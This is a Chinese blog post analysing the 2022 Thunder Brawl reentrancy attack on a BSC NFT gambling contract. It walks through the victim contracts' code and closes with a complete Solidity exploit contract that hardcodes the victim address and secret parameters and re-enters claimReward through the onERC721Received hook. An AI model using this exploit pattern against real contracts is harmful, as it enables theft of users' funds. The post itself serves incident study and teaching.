---
title: Defi安全-Thunder Brawl攻击事件分析
date: 2024-02-28 20:02:34
tags:  ['Defi安全', '安全事件分析']
categories:
  - ['Defi安全']
  - ['安全事件分析']
description: 摘要：Defi安全-Thunder Brawl攻击事件分析--phalcon+bscscan
---

## 1. Thunder Brawl重入攻击事件相关信息

2022年9月30日发生在BSC上的重入攻击，回调函数属于ERC721的hook类型

- 攻击交易的哈希：[Transaction Hash (Txhash) Details | BscScan⁤](https://bscscan.com/tx/0x57aa9c85e03eb25ac5d94f15f22b3ba3ab2ef60b603b97ae76f855072ea9e3a0)
- 攻击者的地址：[Attacker Address | BscScan⁤](https://bscscan.com/address/0xbc62b9ba570ad783d21e5eb006f3665d3f6bba93)
- 攻击合约的地址：[Exploit Contract Address | BscScan](https://bscscan.com/address/0xfed1b640633fd0a4d77315d229918ab1f6e612f9)
- 受害合约的地址：[House_Wallet| BscScan](https://bscscan.com/address/0xae191ca19f0f8e21d754c6cab99107ed62b6fe53#code)，[THB_Roulette| BscScan](https://bscscan.com/address/0x72e901f1bb2bfa2339326dfb90c5cec911e2ba3c#code)

- phalcon攻击序列分析：[Phalcon Explorer (blocksec.com)](https://phalcon.blocksec.com/explorer/tx/bsc/0x57aa9c85e03eb25ac5d94f15f22b3ba3ab2ef60b603b97ae76f855072ea9e3a0)

## 2. Thunder Brawl重入攻击事件分析

该项目应该是一个NFT的游戏合约

![image-20240229121142067](https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202402291216514.png)

1. 攻击合约首先调用受害合约`House Wallet`中的shoot函数

从bscscan上看一下该函数的源码：

```solidity
 function shoot(
        uint256 random,
        uint256 gameId,
        bool feestate,
        uint256 _x,
        string memory name,
        address _add,
        bool nftcheck,
        bool dystopianCheck
    ) external payable {
        require(gameMode);
//首先判断传入的金额是否在规定的范围之内，并计算相应的费用
        if (0.32 * 10**18 >= msg.value && 0.006 * 10**18 <= msg.value) {
            playerFee = ((msg.value * 38) / 1038);
            holderFee = ((playerFee * 25) / 1000);
            liquidityFee = ((playerFee * 1) / 1000);
            ownerFee = ((playerFee * 125) / 100000);
//根据传入的值，判断是否与预先设定的哈希值相等，可以看guesswin函数的源码
            bool checkWinstatus = guessWin(_x, name, _add);
//如果猜对了，将玩家地址和赢得的金额记录到映射中
            if (checkWinstatus == true) {
                winners[gameId][msg.sender] = (msg.value - playerFee);
                winStatus = true;
            }
//相关费用的转账
            if (feestate == true) {
                payable(Fee_Wallet).transfer(holderFee);
                payable(Liqudity_Address).transfer(liquidityFee);
                payable(owner()).transfer(ownerFee);
            }
//随机数的生成和额外NFT奖励的计算与判断，满足相应的条件即用rewardStatus进行相应记录，然而这里攻击者是有可能进行操控的
            randomNumber =
                uint256(
                    keccak256(
                        abi.encodePacked(
                            msg.sender,
                            block.timestamp,
                            randomNumber
                        )
                    )
                ) %
                10;
            if (winStatus == true) {
                if (nftcheck == true && randomNumber == random) {
                    rewardStatus = true;
                }
                winStatus = false;
            } else {
                if (dystopianCheck == true && randomNumber == random) {
                    rewardStatus = true;
                }
            }
        } else {
            fakeUsers.push(msg.sender);
            gameMode = false;
            dangerMode = true;
        }
    }
    function guessWin(
        uint256 _x,
        string memory name,
        address _add
    ) public view returns (bool) {
        return sha256(abi.encode(_x, name, _add)) == hashValueTwo;
    }
```

2. 随后攻击者合约调用了受害合约的claimReward函数，通过函数名可知是计算相应奖励的函数

```solidity
    function claimReward(
        uint256 _ID,
        address payable _player,
        uint256 _amount,
        bool _rewardStatus,
        uint256 _x,
        string memory name,
        address _add
    ) external {
        require(gameMode);
  //首先是对玩家的身份进行相应的确认，验证逻辑不需要详细了解
        bool checkValidity = guess(_x, name, _add);
//如果_amount金额数量对上的话，则给攻击合约转账相应的奖励，_player就是攻击合约的地址
        if (checkValidity == true) {
            if (winners[_ID][_player] == _amount) {
                _player.transfer(_amount * 2);
//这部分发送额外的奖励
                if (_rewardStatus == true) {
                    sendReward();
                }
                delete winners[_ID][_player];
            } else {
                if (_rewardStatus == true) {
                    sendRewardDys();
                }
            }
            rewardStatus = false;
        }
    }
```

3. 接下来进入Thunderbrawl Roulette (THBR)中看一下reward函数的逻辑

```solidity
  function reward(address to,uint256 _mintAmount) external {
        uint256 supply = totalSupply();
        uint256 rewardSupply = rewardTotal;
        require(rewardSupply <= rewardSize,"");
        for (uint256 i = 1; i <= _mintAmount; i++) {          
          _safeMint(to, supply + i); 
          rewardTotal++;         
        }
  }
//上述的RewardStatus攻击者可以操控，这里攻击者将获得NFT奖励
  function _safeMint(
        address to,
        uint256 tokenId,
        bytes memory data
    ) internal virtual {
        _mint(to, tokenId);
        require(
            _checkOnERC721Received(address(0), to, tokenId, data),
            "ERC721: transfer to non ERC721Receiver implementer"
        );
    }
```

4. 这里给攻击合约发送NFT奖励的时候，会触发攻击者的onERC721Received函数，如下图所示

![image-20240228205826174](https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202402282058873.png)

5. 继续观察phalcon的攻击序列，在onERC721Received中攻击者进行重入，再次调用了claimReward函数，传入的参数与之前一模一样，这时攻击者再次获利，重复进入了4次

![image-20240228210235520](https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202402282102830.png)

## 3. Thunder Brawl攻击合约

根据Defihacklab的Foundry仿写的攻击合约代码

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}
interface HouseWallet{
    function winners(uint256 id, address player) view external returns(uint256);
    function claimReward(
        uint256 _ID,
        address payable _player,
        uint256 _amount,
        bool _rewardStatus,
        uint256 _x,
        string memory name,
        address _add
    ) external;
    function shoot(
        uint256 random,
        uint256 gameId,
        bool feestate,
        uint256 _x,
        string memory name,
        address _add,
        bool nftcheck,
        bool dystopianCheck
    ) external payable;
}

contract ContractTest{

    HouseWallet houseWallet = HouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);
    uint256 randomNumber =  12345678000000000000000000;

    uint256 gameId = 1;
    bool feestate = false;
     // sha256(abi.encode(_x, name, _add)) == hashValueTwo maybe off-chain calculate
    uint256 _x = 2845798969920214568462001258446;
    string  name = "HATEFUCKINGHACKERSTHEYNEVERCANHACKTHISIHATEPREVIOUS";
    address _add = 0x6Ee709bf229c7C2303128e88225128784c801ce1;

    bool nftcheck = true;
    bool dystopianCheck = true;

    address payable add = payable(address(this));
    bool _rewardStatus = true;
    // sha256(abi.encode(_x, name, _add)) == hashValue  maybe off-chain calculate
    uint256 _x1 = 969820990102090205468486;
    string name1 = "WELCOMETOTHUNDERBRAWLROULETTENOWYOUWINTHESHOOTINGGAME";
    IERC721 THBR = IERC721(0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C); // Thunderbrawl Roulette Contract

	receive() external payable {}

    function attack() public{
        houseWallet.shoot{value: 0.32 ether}(randomNumber, gameId, feestate, _x, name, _add, nftcheck, dystopianCheck);
        uint256 _amount = houseWallet.winners(gameId, add);
        houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);
    }
    
    function onERC721Received(
        address _operator, 
        address _from, 
        uint256 _tokenId, 
        bytes calldata _data
        ) 
        payable 
        external 
        returns (bytes4){
            uint256 _amount = houseWallet.winners(gameId, add);
            if(address(houseWallet).balance >= _amount * 2){
                houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);
            }
            return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
        }
}
```























